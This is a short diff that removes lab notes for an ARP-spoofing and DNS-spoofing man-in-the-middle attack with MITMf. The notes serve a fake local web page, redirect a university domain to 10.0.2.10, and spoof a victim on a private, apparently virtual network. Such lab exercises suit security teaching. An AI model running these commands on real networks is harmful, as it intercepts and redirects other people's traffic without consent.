@@ -1,8 +1,0 @@
-echo "my person  web page" > /var/www/html/index.html
-service apache2 start
-
-leafpad /etc/mitmf/mitmf.conf
-*.ubalt.edu=10.0.2.10
-
-mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15 -i eth0 --dns
-
